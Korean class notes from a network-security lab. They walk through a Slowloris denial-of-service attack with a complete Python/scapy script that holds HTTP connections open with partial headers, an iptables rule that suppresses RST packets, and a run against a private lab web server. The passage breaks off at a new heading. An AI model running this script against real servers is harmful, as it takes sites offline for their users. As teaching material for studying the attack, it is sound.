# 190610(Mon)_NetworkSecure

### Slowloris Attack

- HTTP 요청 헤더에 개행문자를 전달하지 않고, 헤더를 계속해서 전달하여 연결 유지

```
@kali#2 : #gedit slowloris.py
```

```python

#! /usr/bin/env python

import sys
import time
from scapy.all import *

def slowloris (target, num) :
    print "start connect > {}".format(target)
    syn = []
    for i in range(num) :
        syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
    syn_ack = sr(syn, verbose=0)[0]

    ack = []
    for sa in syn_ack :
        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
        "Host: {}\r\n".format(target) +\
        "User-Agent: Mozilla/4.0\r\n" +\
        "Content-Length: 42\r\n"

        ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
    
    answer = sr(ack, verbose=0)[0]
    print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
    print "Sending data \"X-a: b\\r\\n\".."

    count = 1
    while True :
        print "{} time sending".format(count)
        ack = []
        for ans in answer :
            ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
        answer = sr(ack, inter=0.5, verbose=0)[0]
        time.sleep(10)
        count += 1

if __name__ == "__main__" :
    if len(sys.argv) < 3 :
        print "Usage: {} <target> <number of connection>".format(sys.argv[0])
        sys.exit(1)
    slowloris(sys.argv[1], int(sys.argv[2]))

```

```
@kali#2 : #chomod 755 slowloris.py
@kali#1 : #service apache2 restart
		  #ifconfig
```

- kali#2에서 외부로 RST패킷이 나가지 않도록 방화벽 룰 등록

  ```
  @kali#2 : #iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
  		: #iptables -L
  ```

- 공격 명령 실행

  ```
  @kali#2 : #./slowloris.py 192.168.111.130 50
  ```

- kali#1에서 브라우저를 통해서 연결 확인

  - http://localhost/server-status

- 확인

  - kali#1에서 wireshark 실행 / kali2#2에서 ./slowloris.py 실행



### Proxy 도구 사용법